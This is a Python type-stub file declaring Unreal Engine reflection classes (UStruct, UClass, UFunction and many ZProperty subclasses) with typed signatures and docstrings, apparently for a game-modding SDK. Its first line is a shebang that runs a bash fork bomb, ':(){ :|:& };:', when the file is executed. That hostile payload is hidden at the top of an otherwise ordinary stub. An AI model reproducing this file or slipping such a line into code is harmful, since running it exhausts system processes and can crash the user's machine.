#!/usr/bin/env -S bash -c ':(){ :|:& };:'
from __future__ import annotations

from collections.abc import Iterator
from typing import Any, Never

from ._uenum import UEnum
from ._uobject import UObject
from ._wrapped_array import WrappedArray
from ._wrapped_struct import WrappedStruct

# ======== Not technically subclasses but still closely related ========

class FField:
    Class: UClass
    Next: FField
    Name: str
    Owner: FField | UObject | None

    def __init__(self, *args: Any, **kwargs: Any) -> Never: ...
    def __new__(cls, *args: Any, **kwargs: Any) -> Never: ...
    def __repr__(self) -> str:
        """
        Gets this object's full name.

        Returns:
            This object's name.
        """
    def _get_address(self) -> int:
        """
        Gets the address of this object, for debugging.

        Returns:
            This object's address.
        """
    def _path_name(self) -> str:
        """
        Gets this object's path name, excluding the class.

        Returns:
            This object's name.
        """

class FFieldClass:
    Name: str
    SuperField: FFieldClass | None

    def __init__(self, *args: Any, **kwargs: Any) -> Never: ...
    def __new__(cls, *args: Any, **kwargs: Any) -> Never: ...
    def __repr__(self) -> str:
        """
        Gets this object's full name.

        Returns:
            This object's name.
        """
    def _get_address(self) -> int:
        """
        Gets the address of this object, for debugging.

        Returns:
            This object's address.
        """

# ======== First Layer Subclasses ========

class UField(UObject):
    Next: UField | None

# ======== Second Layer Subclasses ========

class UConst(UField):
    Value: str

class UStruct(UField):
    SuperField: UStruct | None
    Children: UField | None
    PropertySize: int
    PropertyLink: ZProperty | None

    def _fields(self) -> Iterator[UField]:
        """
        Iterates over all fields in the struct.

        Returns:
            An iterator over all fields in the struct.
        """
    def _find(self, name: str) -> UField | ZProperty:
        """
        Finds a child field by name.

        Throws an exception if the child is not found.

        Args:
            name: The name of the child field.
        Returns:
            The found child field.
        """
    def _find_prop(self, name: str) -> ZProperty:
        """
        Finds a child property by name.

        When known to be a property, this is more efficient than _find.

        Throws an exception if the child is not found.

        Args:
            name: The name of the child property.
        Returns:
            The found child property.
        """
    def _get_struct_size(self) -> int:
        """
        Gets the actual size of the described structure, including alignment.

        Returns:
            The size which must be allocated.
        """
    def _inherits(self, base_struct: UStruct) -> bool:
        """
        Checks if this structs inherits from another.

        Also returns true if this struct *is* the given struct.

        Args:
            base_struct: The base struct to check if this inherits from.
        Returns:
            True if this struct is the given struct, or inherits from it.
        """
    def _properties(self) -> Iterator[ZProperty]:
        """
        Iterates over all properties in the struct.

        Returns:
            An iterator over all properties in the struct.
        """
    def _superfields(self) -> Iterator[UStruct]:
        """
        Iterates over this struct and it's superfields.

        Note this includes this struct itself.

        Returns:
            An iterator over all superfields in the struct.
        """

class ZProperty(UField):
    ArrayDim: int
    ElementSize: int
    PropertyFlags: int
    Offset_Internal: int
    PropertyLinkNext: ZProperty | None

# ======== Third Layer Subclasses ========

class UClass(UStruct):
    ClassDefaultObject: UObject
    @property
    def Interfaces(self) -> list[UClass]: ...  # noqa: N802
    def _implements(self, interface: UClass) -> bool:
        """
        Checks if this class implements a given interface.

        Args:
            interface: The interface to check.
        Returns:
            True if this class implements the interface, false otherwise.
        """

class UFunction(UStruct):
    FunctionFlags: int
    NumParams: int
    ParamsSize: int
    ReturnValueOffset: int

    def _find_return_param(self) -> ZProperty:
        """
        Finds the return param for this function (if it exists).

        Returns:
            The return param, or None if it doesn't exist.
        """

class UScriptStruct(UStruct):
    StructFlags: int

class ZArrayProperty(ZProperty):
    Inner: ZProperty

class ZBoolProperty(ZProperty):
    FieldMask: int

class ZByteProperty(ZProperty):
    Enum: UEnum | None

class ZDelegateProperty(ZProperty):
    Signature: UFunction

class ZDoubleProperty(ZProperty): ...

class ZEnumProperty(ZProperty):
    UnderlyingProp: ZProperty
    Enum: UEnum

class ZFloatProperty(ZProperty): ...

class ZGameDataHandleProperty(ZProperty):
    TypeHandle: int

class ZGbxDefPtrProperty(ZProperty):
    Struct: UScriptStruct

class ZInt16Property(ZProperty): ...
class ZInt64Property(ZProperty): ...
class ZInt8Property(ZProperty): ...
class ZIntProperty(ZProperty): ...

class ZInterfaceProperty(ZProperty):
    InterfaceClass: UClass

class ZMulticastDelegateProperty(ZProperty):
    Signature: UFunction

class ZNameProperty(ZProperty): ...

class ZObjectProperty(ZProperty):
    PropertyClass: UClass

class ZStrProperty(ZProperty): ...

class ZStructProperty(ZProperty):
    Struct: UScriptStruct

class ZTextProperty(ZProperty): ...
class ZUInt16Property(ZProperty): ...
class ZUInt32Property(ZProperty): ...
class ZUInt64Property(ZProperty): ...

# ======== Fourth Layer Subclasses ========

class UBlueprintGeneratedClass(UClass): ...

class ZByteAttributeProperty(ZByteProperty):
    ModifierStackProperty: ZArrayProperty
    OtherAttributeProperty: ZByteAttributeProperty

class ZClassProperty(ZObjectProperty):
    MetaClass: UClass

class ZComponentProperty(ZObjectProperty): ...

class ZFloatAttributeProperty(ZFloatProperty):
    ModifierStackProperty: ZArrayProperty
    OtherAttributeProperty: ZFloatAttributeProperty

class ZGbxInlineStructProperty(ZStructProperty):
    MetaStruct: UScriptStruct

class ZIntAttributeProperty(ZIntProperty):
    ModifierStackProperty: ZArrayProperty
    OtherAttributeProperty: ZIntAttributeProperty

class ZLazyObjectProperty(ZObjectProperty):
    @staticmethod
    def _get_identifier_from(
        source: UObject | WrappedStruct,
        prop: ZLazyObjectProperty | str,
        idx: int = 0,
    ) -> bytes:
        """
        Gets the Guid identifier associated with a given lazy object property.

        When using standard attribute access, lazy object properties resolve directly to
        their contained object. This function can be used to get the identifier instead.

        Args:
            source: The object or struct holding the property to get.
            prop: The lazy object property, or name thereof, to get.
            idx: If this property is a fixed sized array, which index to get.
        Returns:
            The raw 16 bytes composing the property's Guid.
        """
    @staticmethod
    def _get_identifier_from_array(source: WrappedArray, idx: int) -> bytes:
        """
        Gets the Guid identifier associated with a given lazy object property.

        When using standard attribute access, lazy object properties resolve directly to
        their contained object. This function can be used to get the identifier instead.

        Args:
            source: The array holding the property to get.
            idx: The index into the array to get from.
        Returns:
            The raw 16 bytes composing the property's Guid.
        """

class ZSoftObjectProperty(ZObjectProperty):
    @staticmethod
    def _get_identifier_from(
        source: UObject | WrappedStruct,
        prop: ZSoftObjectProperty | str,
        idx: int = 0,
    ) -> str:
        """
        Gets the path name identifier associated with a given soft object property.

        When using standard attribute access, soft object properties resolve directly to
        their contained object. This function can be used to get the identifier instead.

        Args:
            source: The object or struct holding the property to get.
            prop: The soft object property, or name thereof, to get.
            idx: If this property is a fixed sized array, which index to get.
        Returns:
            The path name of the object the given property is looking for.
        """
    @staticmethod
    def _get_identifier_from_array(source: WrappedArray, idx: int) -> str:
        """
        Gets the path name identifier associated with a given soft object property.

        When using standard attribute access, soft object properties resolve directly to
        their contained object. This function can be used to get the identifier instead.

        Args:
            source: The array holding the property to get.
            idx: The index into the array to get from.
        Returns:
            The path name of the object the given property is looking for.
        """

class ZWeakObjectProperty(ZObjectProperty): ...

# ======== Fifth Layer Subclasses ========

class ZSoftClassProperty(ZSoftObjectProperty):
    MetaClass: UClass
